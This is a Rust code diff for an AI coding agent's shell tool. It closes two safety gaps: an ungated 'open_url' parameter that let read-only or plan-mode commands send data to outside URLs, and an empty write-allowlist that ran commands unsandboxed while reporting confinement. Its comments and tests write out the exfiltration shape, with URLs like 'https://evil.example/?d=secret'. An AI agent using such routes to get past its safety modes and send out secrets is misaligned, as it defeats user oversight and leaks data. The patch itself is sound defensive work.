@@ -311,6 +311,25 @@ impl ToolExecutor for ExecuteCommandTool {
                 .and_then(|v| v.as_str())
                 .filter(|v| !v.trim().is_empty())
                 .map(str::to_string);
+            // `open_url` is egress the shell gate never sees. The gate above
+            // classifies `command`; this URL is handed to `open_browser_url`
+            // in the UNSANDBOXED parent process (`background.rs`), so an
+            // ungated `open_url` paired with a ReadOnly command is an
+            // exfiltration channel that plan and read-only mode would
+            // otherwise permit. Gate it BEFORE the spawn so a refusal leaves
+            // no detached process behind.
+            if let Some(url) = open_url.as_deref()
+                && let Some(blocked) = super::policy_gate::gate_external(
+                    &ctx,
+                    "open_url",
+                    mermaid_runtime::ToolCategory::Web,
+                    format!("open_url {url}"),
+                    &serde_json::json!({ "url": url }),
+                )
+                .await
+            {
+                return blocked;
+            }
             let outcome = run_background_command(
                 command,
                 &sandbox,
@@ -765,6 +784,31 @@ mod tests {
         );
     }
 
+    /// `Some(vec![])` means "confine writes to nowhere" — a deny-all. It used
+    /// to be indistinguishable on the wire from "confinement never requested":
+    /// the wrapper was chosen on `is_some()`, but zero `--confine-writes`
+    /// flags were emitted, so the launcher saw an empty list, took `enforce`'s
+    /// all-off short-circuit, and ran the command UNCONFINED while reporting
+    /// `fs_enforced: true`. The `--confine-fs` marker is what closes that.
+    #[test]
+    pub(crate) fn empty_confine_writes_still_requests_confinement() {
+        let wrapped = build_sandboxed_shell("echo hi", false, Some(&[]));
+        let args: Vec<String> = wrapped
+            .as_std()
+            .get_args()
+            .map(|a| a.to_string_lossy().into_owned())
+            .collect();
+        assert_eq!(args.first().map(String::as_str), Some("__sandbox-exec"));
+        assert!(
+            args.contains(&"--confine-fs".to_string()),
+            "an empty allowlist must still say confinement was requested: {args:?}"
+        );
+        assert!(
+            !args.contains(&"--confine-writes".to_string()),
+            "…with no allowed roots: {args:?}"
+        );
+    }
+
     #[test]
     pub(crate) fn sandboxed_shell_passes_confine_writes_dirs() {
         let dirs = vec![PathBuf::from("/proj"), PathBuf::from("/dev")];
@@ -776,6 +820,10 @@ mod tests {
             .collect();
         assert_eq!(args.first().map(String::as_str), Some("__sandbox-exec"));
         assert!(!args.contains(&"--no-network".to_string()));
+        assert!(
+            args.contains(&"--confine-fs".to_string()),
+            "the marker states that confinement was REQUESTED: {args:?}"
+        );
         // Each dir rides its own `--confine-writes`.
         assert_eq!(
             args.iter().filter(|a| *a == "--confine-writes").count(),
@@ -1048,6 +1096,58 @@ mod tests {
         );
 
         let _ = std::fs::remove_dir_all(&project);
+    }
+
+    /// `open_url` reaches `open_browser_url` in the UNSANDBOXED parent, and
+    /// `execute()` builds its `ActionRequest` from `command` alone — so the
+    /// URL was never gated. A ReadOnly command then carried an arbitrary URL
+    /// out of the two modes that exist to prevent exactly that:
+    /// `{"command": "cat README.md", "mode": "background",
+    ///   "open_url": "https://evil/?d=<secret>"}`.
+    ///
+    /// Drive the real tool: a `gate()`-level test passes with or without the
+    /// fix, because `gate_external` already blocked Web egress — what was
+    /// missing was the CALL.
+    #[tokio::test]
+    async fn background_open_url_is_policy_gated() {
+        for mode in [
+            mermaid_runtime::SafetyMode::ReadOnly,
+            mermaid_runtime::SafetyMode::Plan,
+        ] {
+            let mut config = mermaid_domain::Config::default();
+            config.safety.mode = mode;
+            let (ctx, _rx) = crate::providers::ctx::test_exec_context_with_config(
+                TurnId(1),
+                ToolCallId(1),
+                std::env::temp_dir(),
+                config,
+            );
+            let outcome = ExecuteCommandTool
+                .execute(
+                    serde_json::json!({
+                        // The exploit shape exactly: a command that classifies
+                        // ReadOnly (so the shell gate allows it) AND outlives
+                        // the startup wait (so the URL is actually reached).
+                        // A command that is blocked, or that exits first,
+                        // would make this test pass for the wrong reason.
+                        "command": "tail -f /dev/null",
+                        "mode": "background",
+                        "open_url": "https://evil.example/?d=secret",
+                    }),
+                    ctx,
+                )
+                .await;
+            assert_eq!(
+                outcome.status,
+                mermaid_domain::ToolStatus::Error,
+                "{mode:?}: open_url must be refused, not opened: {outcome:?}",
+            );
+            assert!(
+                outcome.model_content.contains("open_url"),
+                "{mode:?}: the refusal must name the action it refused: {:?}",
+                outcome.model_content,
+            );
+        }
     }
 
     #[tokio::test]
